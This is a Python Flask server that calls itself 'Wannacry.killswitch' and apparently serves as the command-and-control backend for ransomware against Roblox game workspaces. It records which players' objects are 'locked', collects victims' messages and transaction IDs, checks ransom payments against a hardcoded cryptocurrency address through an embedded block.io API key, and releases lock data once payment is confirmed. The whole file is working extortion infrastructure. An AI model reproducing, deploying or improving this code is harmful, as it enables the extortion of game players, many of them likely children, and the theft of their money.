from sre_constants import _NamedIntConstant
from flask import Flask,request
import base64,time,json,threading,requests

a = Flask(__name__)

def reading(file, c=''):
    content = ''
    try:
        with open(file, 'r') as f:
            content = f.readlines()
    except FileNotFoundError:return None
    except:
        try:
            with open(file, 'rb') as f:
                content = f.readlines()
        except:return None

    if c != '':
        for line in content:
            if c == line:return 1
    return 0

def writing(file,h):
  try:
    with open(file,'a') as f:f.write(f'{h}')
  except:
    with open(file,'ab') as f:f.write(f'{h}'.encode())

@a.route('/')
def index():
    return 'Wannacry.killswitch | made by hex1629'

@a.route('/logs')
def logs_recv():
   data = {}
   files = request.headers.get('Files-X')
   classname = request.headers.get('Class-X')
   value = request.headers.get('Value-X')
   type = request.headers.get('Type')
   locked = request.headers.get('Locked')
   opt = reading('undisabled.json',a)
   if opt == None:
      if files != None:
       data[files] = {"VALUE":value,
                      "CLASSNAME":classname,
                      "TYPE":type,
                      "LOCKED":locked
                      }
       with open('undisabled.json','w') as f:
          f.write(json.dumps(data))
   else:
    if opt == 0:
       if files != None:
           if files is not None:
                  attempt_count = 50  # Maximum number of attempts
                  for _ in range(attempt_count):
                      try:
                          with open('undisabled.json', 'rb') as f:
                              data = json.load(f)
                          break  # Break out of the loop if successful
                      except FileNotFoundError:
                          data = {}  # Handle the case where the file doesn't exist
                          break  # Break out of the loop since there's no need for further attempts
                      except json.decoder.JSONDecodeError:
                          if attempt_count == 1:
                              # Log an error message or inform the user if all attempts fail
                              print("Failed to decode JSON content from 'undisabled.json'.")
                          else:
                              # Inform the user or log the error for the current attempt
                              print("Retrying to decode JSON content from 'undisabled.json'...")
                      except Exception as e:
                          # Log the specific exception for debugging purposes
                          print(f"An error occurred: {e}")

                  # Handle the scenario after attempts
           if _ == attempt_count - 1:
                      return 'DONE'

           # Update or add the new entry to the data dictionary
           data[files] = {
             "VALUE": value,
             "CLASSNAME": classname,
             "TYPE": type,
             "LOCKED": locked
           }

           with open('logs.txt','a') as f:
             f.write(f'{files} HAS BEEN LOCKED !\n')
           with open('undisabled.json', 'w') as f:
             json.dump(data, f)
   return 'DONE'

@a.route('/replace')
def splits_replace():
   data = request.headers.get('X-WNCRY')
   return data.replace('_WNCRY','')

@a.route('/payment')
def payment_checker():
  username = request.headers.get('X-Payment')
  value_coin = request.headers.get('X-Value')
  provided_json = {}
  with open('payment.json','r') as f:provided_json = json.loads(f.read())
  data = {key: value for key, value in provided_json.items() if key.startswith(username)}
  keys_only = list(data.keys())
  if len(keys_only) == 0:
    return 'You not pay or You not send the txid!\nI guarantee the recover for such honest customers.\nSend me a txid in contact us with this message "Txid: XXXXXXXXXX". and trying check again'
  else:
    data = requests.get(f'https://block.io/api/v2/get_raw_transaction/?api_key=5d13-ae8c-f916-6bc1&txid={provided_json[keys_only[0]]}').json()
    print(provided_json[keys_only[0]])

    outputs = [
      {"output_no": output["output_no"], "address": output["address"], "value": output["value"]}
      for output in data["data"]["outputs"]
      if output["address"] != "op_return"
  ]
    for output in outputs:
      if output['address'] == '2N9uWXtpa8P1KMFFXiy8d2Tq2x85SqY4mE4':
          if int(float(output['value'])) == int(value_coin) or int(float(output['value'])) > int(value_coin):
            return 'Good customer you need click undisabled now . . .'
          else:
            return f'Sorry you need send ${value_coin}'
    return 'Not found the address!'

@a.route('/path')
def path_cache():
   username = request.headers.get('X-Username-RBLX')
   print(username)
   if username == 'All':
     provided_json = {}
     with open('undisabled.json','r') as f:provided_json = json.loads(f.read())
     data = dict(provided_json)
     keys_only = list(data.keys())
   else:
    provided_json = {}
    with open('undisabled.json','r') as f:provided_json = json.loads(f.read())
    data = {key: value for key, value in provided_json.items() if key.startswith(f'Workspace.{username}')}
    keys_only = list(data.keys())

   return ','.join(keys_only)

@a.route('/recover')
def recover_cache():
   username = request.headers.get('X-Username-RBLX')
   if username == 'All':
    provided_json = {}
    with open('undisabled.json','r') as f:provided_json = json.loads(f.read())
    data = dict(provided_json)
    keys_only = json.dumps(data)
    return keys_only
   else:
    provided_json = {}
    with open('undisabled.json','r') as f:provided_json = json.loads(f.read())
    data = {key: value for key, value in provided_json.items() if key.startswith(f'Workspace.{username}')}
    return json.dumps(data)

@a.route('/mail')
def mail_recv():
    names,age,id,content = request.headers.get('X-Name-RBLX'),request.headers.get('X-NameAGE-RBLX'),request.headers.get('X-NameID-RBLX'),request.headers.get('Text')
    c = 0
    try:h = f'[{time.ctime()}] - {base64.b64decode(content.encode()).decode()}\n'
    except:return f'{names} Your sending empty text that wrong!'
    a = f'{names}.txt'
    if names != None:
     opt = reading(a,h)
     if opt == None:
       with open(a,'w') as f:f.write(f'.- INFO-{names} -.\nPLAYER={names}\nID-ACCOUNT={id}\nACCOUNT-AGE={age}\n._ INFO-{names} _.\n\n')
     else:
        c = opt
     if c == 0:
      if 'Txid:' in base64.b64decode(content.encode()).decode():
        data = {}
        with open('payment.json','r') as f:
          data = json.loads(f.read())
        data[names] = base64.b64decode(content.encode()).decode().replace('Txid: ','')
        with open('payment.json', 'w') as f:
           json.dump(data, f)
      writing(a,h); writing('msg.txt',f'From {names} '+h)
      if opt != None:
       return f'{names} message has been sent successfully!'
      else:return f'{names}🤫🧏 New Player has been add!\nmsg recv successfully from server!'
     else:
      return f'{names} message has been match before!\n{"  "*len(names)} Oh Sorry That From My Script!'
    else:
     return "We can't process your username!"

a.run(host='0.0.0.0',port=8080)
